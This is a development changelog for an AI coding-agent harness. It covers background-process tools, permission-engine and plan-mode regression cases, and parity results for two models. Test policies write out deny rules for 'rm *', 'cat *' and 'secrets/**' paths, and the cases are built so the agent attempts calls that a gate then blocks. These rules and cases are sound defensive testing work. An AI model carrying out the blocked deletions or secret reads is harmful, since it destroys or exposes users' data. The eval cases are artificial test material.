  no zombie audit rows even if OS kills failed.
- CLI bootstrap auto-sets `bgLogDir = <cwd>/.agent/bg`
  per spec §2.7 — bg works end-to-end via `forja run`
  without operator config.
- 51 unit tests across the subsystem: 14 (repo) +
  20 (manager) + 17 (3 tools) = 51 new tests.
- 3 integration tests in `tests/harness/bg-cleanup.test.ts`
  prove the cleanup hook fires on natural exit, on
  internalError, AND that a missing `bgLogDir`
  produces clean `bg.manager_unavailable` errors
  rather than crashes.
- Regression case `36-bash-background-flow.yaml`
  exercises the full spawn→read→exit cycle. Validated
  1/1 on both Haiku 4.5 ($0.008, 4.8s) and gpt-4o-mini
  ($0.0006, 6.7s).
- Regression case `37-bg-output-kill-under-strict-policy.yaml`
  exercises the full bg flow under `defaults.mode: strict`
  with `tools.bash.allow: ['*echo*']` — proves operator
  policy works end-to-end (spawn passes via bash policy,
  bash_output/bash_kill pass via misc category).
  Validated 1/1 on Haiku ($0.013, 5.5s).

**Code review fixes applied before commit:**

The first draft had three bugs surfaced by review:

1. **Critical — `bash_output` and `bash_kill` denied
   under non-bypass policy.** Both were `category: 'bash'`,
   which routes through `checkBash` which requires
   `args.command`. Neither tool has that arg. Result:
   under any strict / acceptEdits policy, both default-
   denied. Fix: switched to `category: 'misc'` —
   spawn-time was already gated, reading/killing a
   previously-approved process opens no new attack
   surface. Documented the operator-gating gap in
   risks.
2. **Critical — single cursor lost stderr writes when
   stdout outpaced stderr.** Trace: stdout 50B,
   stderr 1B → cursor advances to 50 → next stderr
   read uses start=50, stderr_total=2 → returns empty
   forever (or skips intermediate bytes if stderr
   later exceeds 50). Fix: migration 006 adds
   `stderr_cursor_position`, manager reads two
   independent windows, repo exposes
   `advanceBgProcessStdoutCursor` /
   `advanceBgProcessStderrCursor`, tool surface
   exposes `since_stdout` / `since_stderr` and returns
   `stdout_cursor` / `stderr_cursor` separately.
   Regression test pins the specific failure mode
   (50B stdout + delayed stderr writes both before
   AND after first read).
3. **Critical — engine looked up bash policy by tool
   name, not category.** `bash_background` would never
   match `tools.bash.allow` rules — the engine called
   `lookupRules('bash_background', ...)` instead of
   `lookupRules('bash', ...)`. Operators writing the
   spec-correct `tools.bash.allow: ['npm *']` would
   find every `bash_background` denied. Fix:
   `policySectionFor()` collapses every
   bash-category tool to `tools.bash`. fs.* and
   web.fetch keep their per-tool sections (read_file's
   allow_paths is naturally distinct from
   write_file's). Surfaced by the failing case 37
   smoke; tightening engine logic was the right
   fix, not duplicating policy sections in user
   YAML.

Robustness / minor polish:

- Exit handler IIFE wrapped in try/finally so
  `live.delete(id)` always runs even when DB throws.
  Inner DB operations have their own try/swallow so
  a thrown error doesn't reject the stored Promise
  (kill/cleanup await it).
- Cleanup grace tightened: per-call kill keeps 5s
  default (operator-initiated, can wait), session-end
  cleanup uses 2s. Prevents 5s × N latency at exit
  for a session with many SIGTERM-ignoring processes.

**Decisions taken (not in opener):**

- **`bgManager` is owned by the harness loop, not by
  config.** Spec §13 has bg processes carrying a
  `session_id` FK, and `sessionId` is generated by
  `createSession` inside the loop. A pre-built manager
  passed via config would have stale or null
  sessionId. Solution: `HarnessConfig.bgLogDir`
  declares intent ("enable bg, here's where logs
  go"); the loop instantiates the manager lazily
  after `createSession`. Ownership = lifecycle;
  cleanup runs in the same try/finally that owns the
  session.
- **Tools surface a clean `bg.manager_unavailable`
  when ctx lacks the manager.** Three writes to
  `ToolError`-shape rather than throwing. Lets the
  model see "this capability isn't configured" and
  pick a different approach (use plain `bash`
  instead). Tested explicitly.
- **Cross-session id rejection.** Manager bound to
  session A throws `not in this session: <id>` if
  asked about a process from session B. Defensive —
  the DB is shared, so an attacker-supplied id from
  another session would otherwise leak output.
- **Output read is single-cursor on stdout.** Spec
  §7.3 calls for `bash_output(process_id, since?)` —
  one cursor. We read the same window from both
  stdout and stderr; if stderr lags, the next call
  catches it up. Asymmetric per-stream cursors
  would be more general but isn't what the spec
  specifies, and would complicate the audit trail.
- **`exitCode` recorded even on killed processes.**
  Useful diagnostic — kill via SIGTERM reports 143,
  SIGKILL reports 137. Distinguishing "operator
  killed cleanly" from "kernel had to escalate" is
  visible without log file inspection.

**Cut (out of 2.1, deferred with rationale):**

- **`wait_for` / `monitor` primitives (§7.3.1).**
  Step 2.2. The model can poll via repeated
  `bash_output` today — costs more LLM steps but
  works end-to-end. Spec acknowledges the cost
  difference (~$0.40 polling vs ~$0.10 with
  `wait_for`). 2.1 ships the baseline; 2.2 adds the
  optimization layer.
- **`<BackgroundProcessTray>` UI.** Tray waits for
  Ink work in M3/M4. Status visible today via
  `bash_output` (model view) and `background_processes`
  table (audit view).
- **`/bg cleanup` slash command.** Slash commands
  not implemented. Session-end cleanup covers the
  primary case; orphaned-from-prior-crash cleanup
  waits for slash command surface.
- **Per-process `max_log_bytes`.** No log rotation
  in 2.1. Listed as a documented risk. Add when a
  real workflow saturates disk.

**Pending (M3 next steps after Step 2):**

- Step 2.2 — `wait_for` primitive (`sleep`,
  `file_exists`, `file_change`, `port_open`,
  process-aware conditions on top of 2.1's manager).
- Step 2.3 — `monitor` primitive (streaming
  observation), `http_response` wait condition,
  composition (`all_of` / `any_of`).
- After Step 2: pick the next subsystem from M3
  scope (subagents, MCP, checkpoints+`/undo`,
  `todo_write`, Repo Map).

---

## [2026-04-28] M3 / Step 1.6 — Regression real-model baseline (closes Step 1)

Closes M3 / Step 1 by running the 35-case regression suite
against Anthropic Haiku 4.5 and OpenAI gpt-4o-mini, 3 rounds
each, and producing the parity matrix. Surfaces two
authoring bugs (cases 28 and 29) and four model-capability
divergences on gpt-4o-mini that we explicitly choose to
preserve rather than paper over.

**Why this slice closes Step 1:**

- Step 1.4 (parity matrix) was folded in here when Gemini
  was deferred. With two providers in scope, the
  measurement task IS the parity matrix.
- Step 1 originally targeted "~100 cases." We landed 35.
  Going broader without first proving the suite is stable
  would compound any structural issue (case design, prompt
  framing, expectation scope) across more cases. 35 with
  the parity matrix is the right exit criterion: enough
  surface to be load-bearing, small enough to fix in flight.

**Done — baseline matrix:**

| Provider | Model | Rounds | Pass rate | Total cost | Wall clock | p50 cost/case |
|---|---|---|---|---|---|---|
| Anthropic | Haiku 4.5 | 3 | 105/105 (100%) | $0.7994 | 11.4 min | $0.0042 |
| OpenAI | gpt-4o-mini | 3 | 91/105 (86.7%) | $0.0818 | 8.8 min | $0.0002 |

**Cost ratio: 9.8× cheaper on gpt-4o-mini, with 13.3pp
lower pass rate.** The same dynamic the smoke baseline
recorded (Step 6.3: $0.0050 vs $0.0002 p50, both 100%
on smoke) — at regression depth, the cost gap holds but
the pass rate gap appears.

**Authoring fixes applied DURING the baseline run:**

Smoke-check round (1 round Haiku) before the full baseline
caught two cases that were reliable on Haiku 4.5 but had
expectation/budget issues:

- **Case 28** (`plan-mode-multi-tool-readonly-chain`):
  `status: exhausted` because `maxSteps: 6` was tight
  for grep + read + plan-markdown emission. Bumped to
  `maxSteps: 8`. Strictly more permissive — cannot break
  any other case.
- **Case 29** (`plan-and-policy-coexist`): asserted
  `output_contains: "# Plan"` after a policy-denied
  bash call. Model correctly attempted bash → got
  denied → reported the denial → did NOT emit a plan
  markdown afterward. The case's core invariant is the
  gate-stack composition (`tool_denied: bash` after
  plan-gate let it through). Plan-markdown emission
  was over-broad assertion outside the case's scope.
  Dropped that one assertion. Strictly weaker — cannot
  break what was passing.

Both fixes re-verified on Haiku (35/35 second
smoke-check) before the 3-round baseline kicked off.

**gpt-4o-mini divergences (per-case stability):**

| # | Case | Stability | Diagnosis |
|---|---|---|---|
| 12 | glob → read first match | 0/3 | gpt-4o-mini calls glob and stops — interprets the file list as the answer rather than chaining into read_file |
| 23 | compaction multi-round | 0/3 | Hits `maxSteps: 14` budget. gpt-4o-mini takes more steps than Haiku for the same 10-read sequence. Even with `--timeout-ms 180000` (validated separately), still exhausts. Different completion strategy, not a wall-clock issue |
| 28 | plan + multi-tool readonly chain | 0/3 | Same family as #12: calls grep, never read_file. `status: error` |
| 30 | grep → edit | 0/3 | Same family: calls grep, never edit_file |
| 5 | edit_file disambiguation | 2/3 | Round 2 the model called write_file instead of edit_file, even with the file already existing. Flaky |
| 25 | compaction preserve_tail=0 | 1/3 | Rounds 1+2 picked wrong tools (glob/grep instead of read_file). Round 3 worked. Inconsistent prompt interpretation |

Pattern: 4 of 6 failures are "gpt-4o-mini calls one tool
of a multi-tool chain and stops." Case 23 is a different
family (more-steps-than-Haiku for the same work). Case 5
is rare flake.

**Decisions:**

- **Cases 12, 28, 30, 23 stay in the suite — no prompt
  gaming.** Step 6.5 explicitly documented: "If the
  case fails reliably on one provider but passes on
  another, that's a model capability divergence, not a
  harness bug — record it in the parity matrix and
  accept it." Strengthening prompts ("YOU MUST CALL X
  THEN Y") to satisfy the weaker model would game the
  test, hide the real model gap, and create false
  confidence. The cases capture real coverage on
  Haiku 4.5 and any future stronger model. They will
  light up red on gpt-4o-mini as expected and that's
  diagnostic, not a bug.
- **Provider-aware threshold becomes the gate model.**
  CI gate (deferred per `docs/TODO.md`) cannot use a
  flat 100%-pass threshold across providers. Two
  options:
  1. Per-provider thresholds: 100% on Haiku, ≥85% on
     gpt-4o-mini.
  2. Provider-agnostic core suite + provider-specific
     extension cases: cases known to be model-strength
     dependent live in a sibling tier
     (`evals/regression-frontier/`?).
  Option 2 is conceptually cleaner; option 1 ships
  faster. Defer the choice to when CI gate is
  actually being wired (it's not blocking M3 progress).
- **Case 23's `maxSteps: 14` stays.** Bumping to 20+
  to satisfy gpt-4o-mini would let the case pass on
  any provider regardless of efficiency. The point of
  step budgets is exactly to detect inefficient
  completion paths. Same model-capability-disclosure
  argument.
- **No new harness features required.** Confirmed
  during the run that everything we need is already
  there: NDJSON output, per-case aggregates, variance
  reporting. The only operational improvement is a
  `--timeout-ms` flag that already exists; using it
  per-provider in baseline runs is a doc convention,
  not a code change.

**Cut (kept the close tight):**

- **No live re-categorization of cases into tiers.**
  Sliding cases 12, 23, 28, 30 into a "frontier-only"
  tier today would require both a directory move AND a
  decision on the per-provider gate semantics. Both
  defer to CI-gate work (TODO.md). Today the cases
  stay in `evals/regression/` and the parity matrix
  documents the divergence.
- **No expansion to ~100 cases.** The original Step 1
  target. Reaching 100 means scaling each batch by ~3×.
  Lesson learned in 1.6: scaling cases without
  scaling provider coverage means accumulating
  Haiku-only coverage. Better to scale providers
  next (e.g., add Sonnet 4.6 to the parity matrix —
  cheap, faster, and validates the Anthropic family
  more thoroughly) before adding more cases.
- **No real-model run for case 23 with bumped
  maxSteps.** Validated separately at maxSteps:14 +
  timeout 180s — still exhausts on gpt-4o-mini. The
  capability gap is real, not a budget artifact.

**Pending (M3 next steps after Step 1):**

- M3 Step 2: pick the next subsystem from the M3
  scope: subagents, MCP, checkpoints+`/undo`,
  `bash_background`, `todo_write`, or Repo Map
  (tree-sitter). Priorities driven by which one
  blocks the most downstream work.
- Per-provider CI gate decision, when CI work
  resumes from `docs/TODO.md`.
- Case-tier resolution for divergent cases (option 1
  vs option 2 above) when CI gate lands.

**Risks documented:**

- **Haiku-only suites accumulate silently.** Today
  every regression case was authored against Haiku
  observability. Future cases written without a
  cross-provider sanity check will pile on more
  Haiku-only coverage. Mitigation: every new batch
  should run a 1-round gpt-4o-mini smoke check before
  closing the batch — the cost is trivial ($0.05 per
  35-case round).
- **gpt-4o-mini's chain-stopping pattern may
  generalize.** Cases 12, 28, 30 all fail on the
  same primitive: chain second-tool dispatch. If a
  future user runs Forja against gpt-4o-mini for a
  real workflow that depends on chained tool calls,
  they'll hit the same wall — and we'd rather they
  hit it in our regression suite than in production.
  The 0/3 result is the operator-facing signal:
  "this provider+model combination is not chain-safe
  on tool sequences."
- **The cost gap (9.8×) understates the value gap.**
  Pass rate adjusted: Haiku 4.5 effective cost per
  passed case ≈ $0.0076/case; gpt-4o-mini ≈ $0.0009/
  case but only 86.7% reliable. Quality-weighted, the
  ratio narrows substantially. This nuance belongs in
  M7 (hybrid profile) cost modeling — flagged here so
  the spec PR doesn't quote the raw 9.8× number.

**Spec reference:** `AGENTIC_CLI.md §16` (eval tiers,
golden traces), `PROVIDERS.md §7` (multi-model
first-class), `src/evals/cli.ts` (`--timeout-ms` flag).

---

## [2026-04-28] M3 / Step 1.5 — Regression batch 4: multi-tool flows

Continues M3 / Step 1 with batch 4 — 6 cases that
exercise multi-tool sequences and parallel dispatch. Total
in `evals/regression/` is now 35.

**Step 1.4 collapsed.** The original plan called Step 1.4
"provider adapter parity matrix" (re-run a subset under
OpenAI and Gemini). With Gemini deferred indefinitely
(see `docs/TODO.md`), and with the regression cases being
provider-agnostic by construction (the runner accepts
`--model` for any registered provider), the parity
"matrix" reduces to "run the suite under Anthropic, then
under OpenAI." That's a measurement task, not an authoring
task — it folds into Step 1.6 where we produce the real-
model baseline. Skipping 1.4 doesn't drop coverage; it
recognizes the work was always going to happen under a
different name.

**Why multi-tool flows matter:**

- Real workflows chain tools. Smoke and batches 1-3 are
  largely single-tool: each case proves "tool X works
  for behavior Y." Multi-tool exercises the seam — the
  tool_result of call N flows into the args of call N+1.
- Parallel dispatch (multiple tool_use blocks in one
  assistant turn) is a provider-adapter concern.
  Step 6.3 noted this "behaved correctly" for both
  Anthropic and OpenAI under smoke, but smoke never
  forces parallel dispatch — case 34 does.
- Edit-after-read is the modal refactor pattern; if it
  silently regressed, every code-modifying workflow
  would break and smoke would still pass.

**Done — cases 30-35:**

| # | Flow | Why this case |
|---|---|---|
| 30 | grep → edit_file | Find-and-fix workflow. Asserts the matched file is the one mutated, AND that edit_file (not write_file) was used — preserves the in-place semantics |
| 31 | read_file → write_file (derived) | Data-transformation pattern: read input.json, sum its array, write output.json. Asserts input is preserved verbatim, output contains the derived value |
| 32 | read_file → edit_file (same file) | Read-then-modify-based-on-contents: read version.txt (`41`), edit to `42`. The model's edit_file `old_string` must be derived from the prior read result. Catches a regression where tool_result content fails to round-trip into subsequent tool args |
| 33 | glob → edit_file (one of N) | File-selection-then-mutation: glob finds 3 TS files; edit only `alpha.ts`; assert the other two are unchanged. Three negative `file_contains` assertions — the most defensive case in the batch |
| 34 | parallel tool_use (3 reads, 1 turn) | Explicit instruction to dispatch all three read_file calls in a SINGLE assistant turn. Provider adapters serialize parallel tool_use differently (Anthropic emits multiple tool_use blocks per content array; OpenAI emits a tool_calls array) — this case is the regression net for that adapter logic |
| 35 | glob → read ×N → write_file | 3-step chain. Glob finds 3 TS files, reads each, writes summary.txt with derived data (function return values per file). Asserts depth: 2-step works in cases 30-34, this proves 3-step composes |

**Cut (out of scope for this batch):**

- **No grep → write_file case.** Would test the same
  "tool A drives tool B" axis as case 30 with a
  weaker assertion (write creates new files; edit
  asserts the IN-PLACE constraint). Case 30 is
  strictly stronger.
- **No bash → file-tool chains.** Bash output as input
  to read_file is somewhat implicit in case 35
  (glob → read), and bash → write would test
  composition that's already covered by case 31's
  read → write pattern. Diminishing returns.
- **No 4-step chains.** If 3-step works, 4-step
  failing would be a budget issue
  (`maxSteps`/`maxToolErrors`), not a composition
  issue. Cases 35's 10-step budget already gives the
  model headroom; deeper chains pay for themselves
  only when concrete bugs appear.

**Decisions:**

- **Case 31 uses `[10, 20, 30, 40]` summing to 100.**
  Picked deliberately: `100` is short enough for
  `output_contains` to be unambiguous (no ambient `100`
  in the prompt or fixture), and the math is trivial
  enough that arithmetic errors aren't a model-skill
  test. If a model can't sum 4 small integers, it has
  bigger problems than the harness.
- **Case 32's `41 → 42` is intentional.** `42` is
  unique in the fixture (input is `41`, no other 42s
  exist anywhere in setup). The increment is the
  smallest-possible derived computation — same
  philosophy as case 31, isolating the harness from
  model arithmetic skill.
- **Case 33 asserts unchanged files explicitly.** Three
  separate `file_contains` assertions on the
  not-edited files. Slight assertion bloat but worth
  it: a regression where the model edits the WRONG
  file (e.g., picks delta.ts because of alphabetical
  confusion) would otherwise pass — assertion on the
  target alone wouldn't catch the collateral mutation.
- **Case 34 trusts the model on parallel dispatch.**
  The prompt is explicit ("emit all three read_file
  calls in a SINGLE assistant turn"). If a provider
  adapter regresses — say, splits parallel tool_use
  into sequential calls under the hood — the case
  still passes (3 sequential reads also yields the
  three colors in output). This case proves the
  end-to-end semantics, not the wire-level dispatch
  shape. The wire-level test is in unit coverage
  (`tests/providers/*-stream.test.ts`).

**Pending (Step 1.6):**

- Real-model baseline run across the full 35-case
  suite under Anthropic (Haiku 4.5) and OpenAI
  (gpt-4o-mini), 3 rounds each. Decisions to make at
  that point:
  1. Cost envelope: 35 × ~$0.005 × 3 = ~$0.50 per
     provider per baseline. Acceptable.
  2. Wall-clock: 35 × ~5s × 3 ≈ 8min serial — close
     to the spec target (<10min). Parallelism still
     deferred unless this exceeds.
  3. Drop list: any case that fails reliably across
     rounds for model-behavior reasons (not harness
     bugs) gets pulled per the Step 6.5 honesty pass.

**Risks documented:**

- **Case 34 may not actually parallel-dispatch.**
  Models sometimes ignore the "single turn" hint and
  serialize anyway, especially smaller ones. The
  case still passes via the output assertions
  (sequential reads also produce all three colors),
  but the test is silently weaker than intended. If
  we want to force parallel dispatch as a hard
  invariant, we'd need a new `parallel_tool_use`
  expectation kind that asserts ≥2 tool_use blocks
  appeared in a single assistant message. Tracked
  here, not implemented — adding the expectation
  kind is a §1.7+ harness change.
- **Case 35's three-step chain is the longest in
  the suite.** If the model halts after step 2
  ("here's the data" without writing), the case
  fails on `file_exists: summary.txt`. The prompt
  is explicit about all three steps with numbered
  instructions; further hand-holding would feel
  test-gaming. If the case flakes, the right fix is
  at the suite-level summary (mark as flaky in the
  parity matrix) rather than rephrasing.
- **Case 33's negative assertions can mask reads.**
  `file_contains: src/beta/beta.ts pattern: return 2;`
  passes IF the file is unchanged OR if the model
  rewrote the file with the same content. Highly
  unlikely in practice, but flagging the assertion
  pattern: `file_contains` is presence, not absence
  of mutation. Only `tool_not_called: edit_file`
  would catch a no-op edit, but cases 30/32/33 all
  *want* edit_file to be called once. We accept
  this gap — a model that no-op-edits the wrong
  file is a regression class smoke wouldn't catch
  either.

**Spec reference:** `AGENTIC_CLI.md §7` (tool system),
`§7.1` (tools v1), `PROVIDERS.md` (parallel tool_use
adapter contract), `src/providers/*-stream.ts`
(per-provider parallel-dispatch normalization).

---

## [2026-04-28] M3 / Step 1.3 — Regression batch 3: compaction + plan mode

Continues M3 / Step 1 with batch 3 — 7 cases that
exercise compaction edge cases, plan-mode harness gates,
and the plan/policy gate composition. Total in
`evals/regression/` is now 29.

**Why this slice next:**

- Smoke covers ONE compaction (case 08, `min_count: 1`,
  `strategy: llm`). It does not cover: multiple
  compactions in a single run, the goal-reinjection
  layer's correctness, `preserveTail: 0` (most-aggressive
  fold), or compaction under `--plan`. Each is a real
  failure mode in the spec (`AGENTIC_CLI §6.1`,
  `CONTEXT_TUNING §3`).
- Plan mode smoke covers write_file blocking (case 05).
  edit_file uses a different harness code path
  (`invoke-tool.ts:175-195`); a regression there would
  pass smoke and ship broken. Edge case is worth a
  dedicated case.
- The plan/policy interaction has zero coverage outside
  unit tests. Subagents will extend the gate stack
  (sandbox, then plan, then policy, then hooks); pinning
  the existing two-layer composition NOW means future
  layer additions have a known-good baseline to compare
  against.

**Done — cases 23-29:**

| # | Subsystem | Why this case |
|---|---|---|
| 23 | compaction multi-round | `min_count: 2` — fixture forces ≥2 compactions by re-reading the chunky-modules tree twice. Catches a regression where the second compaction silently no-ops or deadlocks |
| 24 | compaction preserves goal | Embeds literal token `MARKER_24_GOAL_KEPT` in the prompt; asserts it survives in final output despite compaction firing. Tests the goal-reinjection layer (`compact*.ts:240-242` "subsequent compactions must see the ORIGINAL goal") under load |
| 25 | `preserveTail: 0` | Most-aggressive fold: every middle turn becomes summary, no literal tail preserved. Asserts the run still completes to `status: done` and reports the verbatim dependency. Catches a regression where preserve_tail=0 trips the alignment-shift edge (`loop.ts:482-484` `+ 2` accounting) |
| 26 | compaction under `--plan` | 4-axis intersection: plan + read_file ×5 + compaction triggered + plan markdown emitted. Catches regressions where compaction's LLM call somehow trips the plan-mode write gate (it shouldn't — different layer — but composition is exactly the kind of thing that breaks silently) |
| 27 | plan blocks edit_file | Symmetric with smoke 05 on the edit_file path. Different harness code (`invoke-tool.ts` plan-gate predicate), different deny message. Asserts greeting.txt content unchanged after the run |
| 28 | plan + multi-tool read-only chain | grep → read_file chain in plan mode, both pass plan-gate, plan markdown emitted. Negative side: write_file/edit_file not called. Documents that read tools chain freely under plan; the gate is precisely targeted at writes |
| 29 | plan + policy compose | The big one: plan: true + bash with read_only:true + policy `bash.deny: ['cat *']`. Plan-gate sees read_only and lets it pass; policy deny then fires. Asserts `tool_denied: bash` AND plan markdown present AND fixture file unchanged. Catches any regression where one gate silently swallows the other's decision |

**Cut (kept the slice tight):**

- **No `strategy: fallback` case.** Forcing the
  compaction LLM call to fail requires either provider
  fault injection (no surface today) or an unreachable
  network. Mock providers cover this in unit tests
  (`tests/harness/compact*.test.ts`); a real-model case
  would either flake on transient errors or never
  trigger the fallback path. `tool_denied`-style
  rigor: keep harness-internal behavior in unit tests;
  reserve regression for "model + harness end-to-end."
- **No `compaction-skipped` case.** When prompt
  doesn't exceed threshold, no compaction event fires.
  Asserting "no compaction" via absence is weaker than
  asserting presence, and the existing 8 cases without
  compaction triggers already implicitly exercise this
  path (they pass without firing compaction). Skipped
  is the default; default doesn't need a dedicated
  case.
- **No multi-strategy-mix case.** A run where
  compaction round 1 succeeds with `llm` and round 2
  falls back to `fallback` would be the highest-value
  test of the strategy field — but again, requires
  fault injection. Deferred to whenever the harness
  grows a strategy-override env var (`CONTEXT_TUNING`
  open question).

**Decisions:**

- **Fixture reuse over fixture proliferation.** Cases
  23, 24, 25, 26 all consume `chunky-modules`. The
  fixture was sized for one compaction; lowering
  `compactionThreshold` to 0.01 in case 23 forces two
  without changing the fixture. Ad-hoc threshold
  tuning per case keeps fixtures stable.
- **`MARKER_24_GOAL_KEPT` is intentionally weird.** The
  compactor's LLM-summarization step gets a goal that
  contains an explicit "must be honored in your FINAL
  message" instruction. If the summary correctly
  preserves the goal, the marker re-enters the
  context and the model echoes it. If the summary
  paraphrases the goal away (regression), the model
  has no source for the marker. The token's
  uniqueness (`MARKER_24_GOAL_KEPT` is a literal not
  found in any fixture or system prompt) means a hit
  on `output_contains` cannot come from anywhere
  else.
- **Case 29 frames the policy denial as expected.**
  The prompt explicitly says "the policy layer is a
  separate gate — it may block the command for its
  own reasons." Same Step 6.5 mitigation: model has
  permission to attempt the call (so policy gets to
  fire), and the prompt won't trip preemption
  defenses by sounding malicious.

**Pending (Step 1.4 onward):**

- 1.4: provider adapter parity matrix — re-run a
  selected subset of batches 1-3 under OpenAI and
  Gemini (when smoke unblocks), publish the matrix.
- 1.5: multi-tool flows (grep→edit, glob→write,
  bash→edit). Cross-tool sequences not yet tested.
- 1.6: real-model baseline across full ~100-case
  suite, 3 rounds, decide on parallelism.

**Risks documented:**

- **Case 23 budget tight at maxSteps: 14.** Reading
  10 files (5 × 2) plus model thinking turns may
  bump against the cap. If the case starts failing
  with `exhausted` instead of `done`, raise to 16.
  Tracked here so future debugging starts at the
  right knob.
- **Case 24 depends on instruction-following AND
  goal preservation.** Two failure modes that a
  single failed run can't distinguish:
  - Goal got dropped by the summarizer (harness
    bug) — the fix is in `compact*.ts`.
  - Goal preserved but model ignored the marker
    instruction (model bug) — drop the case.
  When this case starts failing, the next-step
  diagnosis is to read the audit log: did the
  post-compaction message stack contain
  `MARKER_24_GOAL_KEPT`? If yes, model-side; if no,
  harness-side. Documented here so the bisection
  is a transcript-read, not a binary search through
  prompt rewording.
- **Case 25's `preserveTail: 0` may break some
  models.** Without literal tail, the model relies
  entirely on its own summary of intent. Smaller
  models (gpt-4o-mini in our smoke set) may lose
  track of where they were in the sequence. If the
  case fails reliably on one provider but passes on
  another, that's a model capability divergence,
  not a harness bug — record it in the parity
  matrix (Step 1.4) and accept it.

**Spec reference:** `AGENTIC_CLI.md §5` (plan mode),
`§6.1` (compaction), `CONTEXT_TUNING.md §3` (preserve
parameters), `src/harness/compact*.ts` (goal preservation
implementation).

---

## [2026-04-28] M3 / Step 1.2 — Regression batch 2: permission engine

Continues M3 / Step 1.1 with batch 2 — 10 cases that
exercise the permission engine surface (`src/permissions/
engine.ts`). Each case ships its own
`.agent/permissions.yaml` via `setup.files`, which the eval
executor wires up automatically (`src/evals/executor.ts`
drops a default `bypass` policy only when the case+fixture
didn't provide one — see lines 108-115).

**Why permissions next:**

- Smoke runs entirely in default `bypass`. The engine has
  unit coverage but never round-tripped under load with a
  real model emitting tool calls under deny rules. M2's
  smoke proves "the model uses tools"; this proves "the
  model handles being told no."
- The engine is the surface that subagents (M3 next),
  MCP (M3+), and hooks (M4) layer on top of. Catching
  regressions here BEFORE those subsystems land means we
  know any future deny-class bug is in the layer above,
  not below.

**Done — cases 13-22 (numbered to extend batch 1):**

| # | Engine surface | Why this case |
|---|---|---|
| 13 | `defaults.mode: strict` + no rules → default deny | Bedrock invariant: empty strict = nothing allowed. Asserts `tool_denied` after the model tries — proves the gate fires, not just that the model preempted |
| 14 | `confirm_paths` + no UI → silent deny | Documents the M1-era behavior (`invoke-tool.ts:235-251`): confirm becomes `confirm_no` when no operator. Uses `file_not_exists` instead of `tool_denied` because the engine emits `kind: confirm`, not `deny` — cleanly distinguishes the two paths |
| 15 | `bash.allow` matches → allow | Positive case: the rule actually permits when intended. `echo *` with `read_only: true` |
| 16 | `bash.deny` wins over `bash.allow` | Asserts the deny-precedence invariant from `engine.ts:90-95` — gives the model BOTH `allow: ['*']` and `deny: ['rm *']`, expects `rm` denied |
| 17 | `write_file.deny_paths` blocks under `acceptEdits` | Confirms deny_paths fires even under acceptEdits (the most permissive non-bypass mode). `secrets/**` blocked despite `allow_paths: ['**']` |
| 18 | `write_file.allow_paths` permits under strict | Positive path-rule case: `*.md` allows `notes.md`. Mirror of #20 |
| 19 | `read_file.deny_paths` blocks reads | Symmetric with #17 for the read axis. Catches any future regression where deny_paths is silently treated as write-only |
| 20 | strict + write outside allow_paths → deny | Negative path-rule case: `*.md` rule does NOT cover `data.json`. Default deny under strict |
| 21 | acceptEdits + no rule → still deny | The single most likely confusion vector for users: "acceptEdits" sounds like "allow all edits". It's not — it auto-accepts `confirm_paths` matches but unmatched paths still deny (`engine.ts:172-175`). This case proves the engine matches the JSDoc |
| 22 | `bypass` short-circuits even deny rules | `engine.ts:221-223` returns `allow` before any rule runs. Asserts that adding a deny rule to a bypass policy is a no-op — important for operators who think they're "hardening" bypass with selective denies |

**Cut (bounded scope):**

- **No `confirm` decision via `tool_denied`.** The
  `tool_denied` expectation fires only on `kind: 'deny'`
  per `executor.ts:137-141`. Confirm decisions emit
  `kind: 'confirm'` and the harness layer turns them
  into `confirm_no` errors. Case 14 routes around this
  by asserting on `file_not_exists` directly. Adding
  a `tool_confirmed` expectation kind was considered
  and rejected — the existing surface is enough; one
  more discriminant would be paid for thinly until
  the M2 confirm-UI lands.
- **No FetchPolicy cases.** `web.fetch` is the engine
  category, but no `fetch_url` tool exists yet — the
  builtin tool surface stops at the 6 from M1. Coverage
  arrives when the tool does, not before.
- **No hierarchy cases (enterprise / user / project /
  session).** `src/permissions/hierarchy.ts` resolves
  layered policies, but eval cases ship a single
  `.agent/permissions.yaml` (the project layer). Real
  hierarchy testing needs multi-file fixtures and
  potentially HOME/XDG override surfaces — out of
  scope for batch 2, comes back when subagents start
  using the session layer.

**Decisions:**

- **Phrase prompts so the model attempts the call.**
  Step 6.5's lesson cuts here too: aligned models
  preempt suspicious requests. For deny-class cases
  (13, 16, 17, 19, 20, 21) the prompt explicitly says
  "report whatever the tool returns, even if it's a
  denial — do NOT switch tools, do NOT retry." The
  model needs to invoke the gated tool for the engine
  to deny it; if it preempts, `tool_denied` fails
  vacuously. Mitigation: model has no policy
  visibility (verified — policy doesn't leak into
  system prompt; checked `harness/loop.ts:206`), so it
  attempts naturally unless something in the prompt
  itself looks dangerous.
- **`acceptEdits` confusion gets its own case (#21).**
  This is the only spec-§8 nuance ("aceita edits sem
  confirmação") that consistently surprises operators
  reading the policy file. Ship it as a regression
  pinning the documented behavior so any future
  refactor that loosens it lights up red.
- **Loader-level guarantees re-validated implicitly.**
  Each `.agent/permissions.yaml` shipped via
  `setup.files` round-trips through
  `loadPolicyFromFile` at engine construction. A
  YAML key typo (`allow_path` singular) would crash
  the case at load time with the policy parser's
  rejection message — so these cases also prove the
  policy parser stays strict-but-tolerant under load.

**Pending (Step 1.3 onward):**

- Compaction edge cases: preserve-tail boundaries,
  fallback strategy when LLM call fails, multiple
  compactions in one run.
- Plan mode + multi-tool interleaving (plan + bash +
  edit attempt).
- Cross-cutting: bash deny when plan mode also active
  (which gate fires first?).

**Risks documented:**

- **Cases 13, 16, 17, 19, 20, 21 depend on the model
  attempting the call.** Same vector that bit Step 6.5.
  Mitigation in prompt phrasing above. Worst case: a
  case fails 0/3 because the model preempted on every
  round. The right response then is to drop the case
  (per the Step 6.5 honesty pass), not to tweak the
  prompt until it works — model-behavior tests vs
  harness-behavior tests stay separated.
- **Path glob semantics use `**` literally.** YAML
  parsers can be subtle about `**` inside flow scalars;
  block scalars (used here) sidestep the issue. If a
  future case writes the policy inline as a flow scalar
  and `**` interacts with anchors/aliases, the rule
  silently doesn't match. Pin the convention: always
  block-scalar policy YAMLs in `setup.files`.

**Spec reference:** `AGENTIC_CLI.md §8` (permission
engine), `§9` (trust & safety), `src/permissions/engine.ts`
(deny-precedence and bypass-shortcircuit invariants).

---

## [2026-04-28] M3 / Step 1.1 — Regression tier scaffold + first batch

Opens M3 by attacking the spec §16 mandate "regression
(~100 cases, < 10min) — todo PR" before subsystems that
will lean on it (subagents, MCP, checkpoints). Step 1.1 is
the first slice: scaffold `evals/regression/` and land a
first batch (~12-15) of cases that exercise tool surface
